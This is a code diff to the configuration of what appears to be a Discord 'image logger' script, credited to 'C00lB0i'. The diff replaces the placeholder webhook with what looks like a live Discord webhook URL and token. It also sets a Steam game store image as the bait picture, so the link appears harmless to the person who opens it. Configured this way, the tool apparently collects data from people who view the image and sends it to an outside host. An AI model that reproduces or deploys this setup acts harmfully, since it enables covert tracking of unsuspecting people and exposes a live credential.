@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1462284350442700800/bM6txf7yYg37ZjuPnWvD6dwroFgluRKCvRqiaLKX6d15o_Q4TvMPozPLgUQyjGL74VUe",
+    "image": "https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3188910/93e2b1dfc814aad344e10233c98e7520c266ed7b/capsule_616x353.jpg?t=1756824331", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
